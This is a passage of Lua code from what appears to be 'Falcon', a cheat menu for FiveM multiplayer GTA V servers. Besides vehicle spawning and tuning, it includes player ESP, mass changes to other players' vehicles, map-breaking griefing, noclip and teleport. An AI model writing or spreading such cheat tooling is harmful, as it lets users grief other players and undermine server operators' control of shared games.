            elseif Falcon.MenuButton('Muscle', 'muscle') then
            elseif Falcon.MenuButton('Sports Classics', 'sportsclassics') then
            elseif Falcon.MenuButton('Sports', 'sports') then
            elseif Falcon.MenuButton('Super', 'super') then
            elseif Falcon.MenuButton('Motorcycles', 'motorcycles') then
            elseif Falcon.MenuButton('Off-Road', 'offroad') then
            elseif Falcon.MenuButton('Industrial', 'industrial') then
            elseif Falcon.MenuButton('Utility', 'utility') then
            elseif Falcon.MenuButton('Vans', 'vans') then
			elseif Falcon.MenuButton('Cycles', 'cycles') then
			elseif Falcon.MenuButton('Boats', 'boats') then
			elseif Falcon.MenuButton('Helicopters', 'helicopters') then
			elseif Falcon.MenuButton('Planes', 'planes') then
			elseif Falcon.MenuButton('Service/Emergency/Military', 'service') then
			elseif Falcon.MenuButton('Commercial/Trains', 'commercial') then
			end
        

        elseif Falcon.IsMenuOpened('compacts') then
            for i = 1, #compacts do
                local vehname = GetLabelText(compacts[i])
                if vehname == "NULL" then vehname = compacts[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('sedans') then
            for i = 1, #sedans do
                local vehname = GetLabelText(sedans[i])
                if vehname == "NULL" then vehname = sedans[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('suvs') then
            for i = 1, #suvs do
                local vehname = GetLabelText(suvs[i])
                if vehname == "NULL" then vehname = suvs[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('coupes') then
            for i = 1, #coupes do
                local vehname = GetLabelText(coupes[i])
                if vehname == "NULL" then vehname = coupes[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('muscle') then
            for i = 1, #muscle do
                local vehname = GetLabelText(muscle[i])
                if vehname == "NULL" then vehname = muscle[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('sportsclassics') then
            for i = 1, #sportsclassics do
                local vehname = GetLabelText(sportsclassics[i])
                if vehname == "NULL" then vehname = sportsclassics[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('sports') then
            for i = 1, #sports do
                local vehname = GetLabelText(sports[i])
                if vehname == "NULL" then vehname = sports[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('super') then
            for i = 1, #super do
                local vehname = GetLabelText(super[i])
                if vehname == "NULL" then vehname = super[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(super[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('motorcycles') then
            for i = 1, #motorcycles do
                local vehname = GetLabelText(motorcycles[i])
                if vehname == "NULL" then vehname = motorcycles[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(motorcycles[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('offroad') then
            for i = 1, #offroad do
                local vehname = GetLabelText(offroad[i])
                if vehname == "NULL" then vehname = offroad[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('industrial') then
            for i = 1, #industrial do
                local vehname = GetLabelText(industrial[i])
                if vehname == "NULL" then vehname = industrial[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('utility') then
            for i = 1, #utility do
                local vehname = GetLabelText(utility[i])
                if vehname == "NULL" then vehname = utility[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('vans') then
            for i = 1, #vans do
                local vehname = GetLabelText(vans[i])
                if vehname == "NULL" then vehname = vans[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('cycles') then
            for i = 1, #cycles do
                local vehname = GetLabelText(cycles[i])
                if vehname == "NULL" then vehname = cycles[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('boats') then
            for i = 1, #boats do
                local vehname = GetLabelText(boats[i])
                if vehname == "NULL" then vehname = boats[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('helicopters') then
            for i = 1, #helicopters do
                local vehname = GetLabelText(helicopters[i])
                if vehname == "NULL" then vehname = helicopters[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('planes') then
            for i = 1, #planes do
                local vehname = GetLabelText(planes[i])
                if vehname == "NULL" then vehname = planes[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
                end
            end
        

        elseif Falcon.IsMenuOpened('service') then
            for i = 1, #service do
                local vehname = GetLabelText(service[i])
                if vehname == "NULL" then vehname = service[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(service[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('commercial') then
            for i = 1, #commercial do
                local vehname = GetLabelText(commercial[i])
                if vehname == "NULL" then vehname = commercial[i] end
                local carButton = Falcon.Button(vehname)
                if carButton then
                    SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn, vehiclesSpawnUpgraded, spawnvehgod)
                end
            end
        

        elseif Falcon.IsMenuOpened('vehiclemods') then
            if Falcon.MenuButton("Vehicle Colors", 'vehiclecolors') then
                elseif Falcon.MenuButton("Tune Vehicle", 'vehicletuning') then
                elseif Falcon.Button("Set Plate Text (8 Characters)") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)	
			elseif Falcon.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Colour", RainbowVeh) then
                RainbowVeh = not RainbowVeh
				
			elseif Falcon.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Neon", ou328hNeon) then
                ou328hNeon = not ou328hNeon
			elseif Falcon.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Sync", ou328hSync) then
                ou328hSync = not ou328hSync
			
             end
        

        elseif Falcon.IsMenuOpened('vehiclecolors') then
            if Falcon.MenuButton("Primary Color", 'vehiclecolors_primary') then
                elseif Falcon.MenuButton("Secondary Color", 'vehiclecolors_secondary') then
                
            end
        
        elseif Falcon.IsMenuOpened('vehiclecolors_primary') then
            if Falcon.MenuButton("Classic Colors", 'primary_classic') then
                elseif Falcon.MenuButton("Matte Colors", 'primary_matte') then
                elseif Falcon.MenuButton("Metals", 'primary_metal') then
            end
        
        elseif Falcon.IsMenuOpened('vehiclecolors_secondary') then
            if Falcon.MenuButton("Classic Colors", 'secondary_classic') then
                elseif Falcon.MenuButton("Matte Colors", 'secondary_matte') then
                elseif Falcon.MenuButton("Metals", 'secondary_metal') then
            end
        

        elseif Falcon.IsMenuOpened('primary_classic') then
            for i = 1, #classicColors do
                if Falcon.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, classicColors[i][2], sec)
                end
            end
        

        elseif Falcon.IsMenuOpened('primary_matte') then
            for i = 1, #matteColors do
                if Falcon.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, matteColors[i][2], sec)
                end
            end
        

        elseif Falcon.IsMenuOpened('primary_metal') then
            for i = 1, #metalColors do
                if Falcon.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, metalColors[i][2], sec)
                end
            end
        

        elseif Falcon.IsMenuOpened('secondary_classic') then
            for i = 1, #classicColors do
                if Falcon.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, classicColors[i][2])
                end
            end
        

        elseif Falcon.IsMenuOpened('secondary_matte') then
            for i = 1, #matteColors do
                if Falcon.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, matteColors[i][2])
                end
            end
        

        elseif Falcon.IsMenuOpened('secondary_metal') then
            for i = 1, #metalColors do
                if Falcon.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, metalColors[i][2])
                end
            end
        

        elseif Falcon.IsMenuOpened('vehicletuning') then
            if Falcon.Button('Max All Upgrades', '<3') then
                maxUpgrades(GetVehiclePedIsIn(PlayerPedId()))
    end
        
		elseif Falcon.IsMenuOpened("VehBoostMenu") then
                if Falcon.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif Falcon.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif Falcon.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
            end
            
        elseif Falcon.IsMenuOpened("VehTorque") then
            if Falcon.Button('Engine Torque boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x2') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x4') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x8') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x16') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x32') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x64') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x128') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x256') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 256.0 * 20.0)
            elseif Falcon.Button('Engine Torque boost ~h~~g~x512') then
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
            end
    

        elseif Falcon.IsMenuOpened('vehiclemenu') then
            if Falcon.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
					SavedVehicle = not SavedVehicle
					RemoveBlip(pvblip)
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvblip = AddBlipForEntity(pvehicle)
					SetBlipSprite(pvblip, 225)
					SetBlipColour(pvblip, 84) 
					ShowInfo("~g~Current Vehicle Saved")
					pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                elseif SavedVehicle then
					SavedVehicle = not SavedVehicle
					pvehicle = nil
                    RemoveBlip(pvblip)
					ShowInfo("~b~Saved Vehicle Blip Removed")
				else
					ShowInfo("~r~You are not in a vehicle!")
                end



            elseif Falcon.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
                LeftFrontDoor = not LeftFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftFrontDoor then
                    SetVehicleDoorOpen(vehicle, 0, nil, true)
                elseif not LeftFrontDoor then
                    SetVehicleDoorShut(vehicle, 0, true)
                end
            elseif Falcon.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then
                RightFrontDoor = not RightFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightFrontDoor then
					SetVehicleDoorOpen(vehicle, 1, nil, true)
                elseif not RightFrontDoor then
					SetVehicleDoorShut(vehicle, 1, true)
                end
            elseif Falcon.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
                LeftBackDoor = not LeftBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftBackDoor then
					SetVehicleDoorOpen(vehicle, 2, nil, true)
                elseif not LeftBackDoor then
					SetVehicleDoorShut(vehicle, 2, true)
                end
            elseif Falcon.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
                RightBackDoor = not RightBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightBackDoor then
					SetVehicleDoorOpen(vehicle, 3, nil, true)
                elseif not RightBackDoor then
					SetVehicleDoorShut(vehicle, 3, true)
                end
            elseif Falcon.CheckBox("Hood", FrontHood, "Closed", "Opened") then
                FrontHood = not FrontHood
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if FrontHood then
					SetVehicleDoorOpen(vehicle, 4, nil, true)
                elseif not FrontHood then
					SetVehicleDoorShut(vehicle, 4, true)
                end
            elseif Falcon.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                Trunk = not Trunk
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Trunk then
					SetVehicleDoorOpen(vehicle, 5, nil, true)
                elseif not Trunk then
					SetVehicleDoorShut(vehicle, 5, true)
                end
            elseif Falcon.CheckBox("Back", Back, "Closed", "Opened") then
                Back = not Back
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back then
					SetVehicleDoorOpen(vehicle, 6, nil, true)
                elseif not Back then
					SetVehicleDoorShut(vehicle, 6, true)
                end
            elseif Falcon.CheckBox("Back 2", Back2, "Closed", "Opened") then
                Back2 = not Back2
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back2 then
					SetVehicleDoorOpen(vehicle, 7, nil, true)
                elseif not Back2 then
					SetVehicleDoorShut(vehicle, 7, true)
                end
            end


        elseif Falcon.IsMenuOpened('world') then
            if Falcon.MenuButton("~h~~y~»~r~ Object Spawner", 'objectspawner') then
            elseif Falcon.MenuButton("~h~~y~»~r~ Time Changer", 'time') then
            elseif Falcon.Button("~h~~y~»~b~ Set All Nearby Vehicles Plate Text") then
            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
            elseif Falcon.CheckBox("~h~~y~»~b~ Clear Streets", ClearStreets) then
                ClearStreets = not ClearStreets
            elseif Falcon.CheckBox("~h~~y~»~b~ Noisy Cars", NoisyCars) then
                NoisyCars = not NoisyCars
                if not NoisyCars then
                    for k in EnumerateVehicles() do
                        SetVehicleAlarmTimeLeft(k, 0)
                    end
                end
            elseif Falcon.CheckBox("~h~~y~»~b~ Make All Cars Fly", FlyingCars) then
                FlyingCars = not FlyingCars
            elseif Falcon.ComboBoxSlider("~h~~y~»~b~ Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                currGravIndex = currentIndex
                selGravIndex = currentIndex
                GravAmount = GravityOps[currGravIndex]

                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleGravityAmount(k, GravAmount)
                end
            end) then
            elseif Falcon.Button("~h~~y~»~b~ Fuck Up The Map") then
                if not FuckMap then
                    ShowInfo("~b~Fucking Up Map")
                    FuckMap = true
                else
                    ShowInfo("~r~Map Already Fucked")
                end
			end
        
        

        elseif Falcon.IsMenuOpened('objects') then
        if Falcon.Button("Spawn Object") then
            local pos = GetEntityCoords(PlayerPedId())
            local pitch = GetEntityPitch(PlayerPedId())
            local roll = GetEntityRoll(PlayerPedId())
            local yaw = GetEntityRotation(PlayerPedId()).z
            local xf = GetEntityForwardX(PlayerPedId())
            local yf = GetEntityForwardY(PlayerPedId())
            local spawnedObj = nil
            if currDirectionIndex == 1 then
                spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
            elseif currDirectionIndex == 2 then
                spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
            end
            SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
            SetEntityVisible(spawnedObj, objVisible, 0)
            FreezeEntityPosition(spawnedObj, 1)
            table.insert(SpawnedObjects, spawnedObj)  
            elseif Falcon.ComboBox("Object To Spawn", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
				currObjIndex = currentIndex
				selObjIndex = currentIndex
				obj = objs_tospawn[currObjIndex]
				end) then
            elseif Falcon.Button("Add Object By Name") then
				local testObj = GetKeyboardInput("Enter Object Model Name:")
				local pos = GetEntityCoords(PlayerPedId())
				local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
				SetEntityVisible(addedObj, 0, 0)
				if table.contains(objs_tospawn, testObj) then
					ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
				elseif DoesEntityExist(addedObj) then
					objs_tospawn[#objs_tospawn + 1] = testObj
					ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
				else
					ShowInfo("~r~Model " .. testObj .. " does not exist!")
				end
				RequestControlOnce(addedObj)
				DeleteObject(addedObj)
            elseif Falcon.CheckBox("Visible", objVisible) then
                objVisible = not objVisible
            elseif Falcon.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
                currDirectionIndex = currentIndex
                selDirectionIndex = currentIndex
            end) then
        elseif Falcon.MenuButton("Spawned Objects", 'objectlist') then
        end
        
        elseif Falcon.IsMenuOpened('objectlist') then
            if Falcon.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if Falcon.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                            RequestControlOnce(SpawnedObjects[i])
                            DeleteObject(SpawnedObjects[i])
                        end
                    end
                end
            end
        

		elseif Falcon.IsMenuOpened('weather') then
		    if Falcon.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                    	 currWeatherIndex = currentIndex
                    	 selWeatherIndex = currentIndex
                    	 WeatherType = WeathersList[currentIndex]
		    end) then
		    elseif Falcon.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
		  	  WeatherChanger = not WeatherChanger
		    end
		
			Falcon.Display()
		elseif Falcon.IsMenuOpened('serverOptionsResources') then
			for i=0, #serverOptionsResources do
				if Falcon.Button(serverOptionsResources[i]) then
				end
			end

        elseif Falcon.IsMenuOpened('misc') then
            Falcon.SetSubTitle('misc', 'Server IP: '..GetCurrentServerEndpoint())
            if Falcon.MenuButton("~r~→  ~s~Weather Changer ~r~(CLIENT SIDE)", 'weather') then    
            elseif Falcon.MenuButton('~r~→  ~s~Server Resources', 'serverOptionsResources') then
            elseif Falcon.MenuButton("~r~→  ~s~ESP & Visual", 'esp') then
			elseif Falcon.MenuButton("~r~→  ~s~Keybindings", 'keybindings') then
            elseif Falcon.CheckBox('Force Map', ForceMap) then
                ForceMap = not ForceMap
            elseif Falcon.CheckBox('Crosshair Original', Crosshair) then
                Crosshair = not Crosshair
            elseif Falcon.CheckBox('Crosshair Plus', Crosshair2) then
                Crosshair2 = not Crosshair2
            elseif Falcon.CheckBox('Force Third Person', ForceThirdPerson) then
                ForceThirdPerson = not ForceThirdPerson
            elseif Falcon.Button("Spawn a Train") then   
                qp()
            elseif Falcon.Button("Delete the Train") then
                qv()
            elseif Falcon.CheckBox("Show Coordinates", ShowCoords) then
                ShowCoords = not ShowCoords
            elseif Falcon.CheckBox("~b~ Disable Cars", CarsDisabled) then
                CarsDisabled = not CarsDisabled
            elseif Falcon.CheckBox("~b~ Disable Guns", GunsDisabled) then
                GunsDisabled = not GunsDisabled
            elseif Falcon.ComboBoxSlider("~b~ Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                currGravIndex = currentIndex
                selGravIndex = currentIndex
                GravAmount = GravityOps[currGravIndex]

                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleGravityAmount(k, GravAmount)
                end
            end) then
            elseif Falcon.CheckBox('~c~Thermal Vision', thermalVision) then thermalVision = not thermalVision SetSeethrough(thermalVision)
            elseif Falcon.CheckBox('~c~Night Vision', nightVision) then nightVision = not nightVision SetNightvision(nightVision)
            end

    elseif Falcon.IsMenuOpened('esp') then
        if Falcon.Button("Esp is not working rn!") then
        elseif Falcon.CheckBox("Blips", BlipsEnabled) then
                ToggleBlips()
        elseif Falcon.CheckBox('Enable', visualsESPEnable) then
				visualsESPEnable = not visualsESPEnable
				FiveM.toggleESP()
			elseif Falcon.CheckBox('Self', visualsESPShowSelf) then
				visualsESPShowSelf = not visualsESPShowSelf
			elseif Falcon.CheckBox('Line', visualsESPShowLine) then
				visualsESPShowLine = not visualsESPShowLine
			elseif Falcon.CheckBox('Box', visualsESPShowBox) then
				visualsESPShowBox = not visualsESPShowBox
			elseif Falcon.CheckBox('ID', visualsESPShowID) then
				visualsESPShowID = not visualsESPShowID
			elseif Falcon.CheckBox('Name', visualsESPShowName) then
				visualsESPShowName = not visualsESPShowName
			elseif Falcon.CheckBox('Distance', visualsESPShowDistance) then
				visualsESPShowDistance = not visualsESPShowDistance
			elseif Falcon.CheckBox('Weapon', visualsESPShowWeapon) then
				visualsESPShowWeapon = not visualsESPShowWeapon
			elseif Falcon.CheckBox('Vehicle', visualsESPShowVehicle) then
				visualsESPShowVehicle = not visualsESPShowVehicle
			elseif Falcon.ComboBoxSlider("ESP Refresh Rate", visualsESPRefreshRates, currentESPRefreshIndex, selectedESPRefreshIndex, 
				function(currentIndex, selectedIndex)
					currentESPRefreshIndex = currentIndex
					selectedESPRefreshIndex = currentIndex
					if currentIndex == 1 then
						visualsESPRefreshRate = 0
					elseif currentIndex == 2 then
						visualsESPRefreshRate = 50
					elseif currentIndex == 3 then
						visualsESPRefreshRate = 150
					elseif currentIndex == 4 then
						visualsESPRefreshRate = 250
					elseif currentIndex == 5 then
						visualsESPRefreshRate = 500
					elseif currentIndex == 6 then
						visualsESPRefreshRate = 1000
					elseif currentIndex == 7 then
						visualsESPRefreshRate = 2000
					elseif currentIndex == 8 then
						visualsESPRefreshRate = 5000
					end
                end) then
            end
                    


		elseif Falcon.IsMenuOpened('keybindings') then
			if Falcon.CheckBox("Menu Keybind:", 0, menuKeybind, menuKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					menuKeybind = key
					ShowInfo("Menu bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif Falcon.CheckBox("Noclip Keybind:", 0, noclipKeybind, noclipKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					noclipKeybind = key
					ShowInfo("Noclip bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif Falcon.CheckBox("Fix Vehicle Keybind:", 0, fixvaiculoKeyblind, fixvaiculoKeyblind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					fixvaiculoKeyblind = key
					ShowInfo("FixVeh bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif Falcon.CheckBox("Heal Self Keybind:", 0, healmeckbind, healmeckbind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					healmeckbind = key
					ShowInfo("Heal Self bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			end

        elseif Falcon.IsMenuOpened('webradio') then
            if Falcon.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
				ClassicalRadio = not ClassicalRadio
				if ClassicalRadio then
					RadioDUI = CreateDui("http://cms.stream.publicradio.org/cms.mp3", 1, 1)
					ShowInfo("~b~Now Playing...")
				else
					DestroyDui(RadioDUI)
					ShowInfo("~r~Web Radio Stopped!")
				end
			end
       

        elseif Falcon.IsMenuOpened('teleport') then
            if Falcon.MenuButton('~r~→  ~s~Save/Load Position', 'saveload') then
            elseif Falcon.ComboBox("~h~~y~» ~s~Teleport to ~r~POIS", {"~b~Car ~s~Dealership", "~b~Legion ~s~Square", "~b~Grove ~s~Street", "~b~LSPD HQ", "~b~Sandy Shores ~s~BCSO HQ", "~b~Paleto Bay ~s~BCSO HQ", "~b~FIB Top ~s~Floor", "~b~FIB ~s~Offices", "~b~Michael's ~s~House", "~b~Franklin's ~s~First House", "~b~Franklin's ~s~Second House", "~b~Trevor's ~s~Trailer", "~b~Tequi-~s~La-La"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
                    currPFuncIndex = currentIndex
                    selPFuncIndex = currentIndex
                    end) then
                    if selPFuncIndex == 1 then
                        SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
                    elseif selPFuncIndex == 2 then
                        SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
                    elseif selPFuncIndex == 3 then
                        SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
                    elseif selPFuncIndex == 4 then
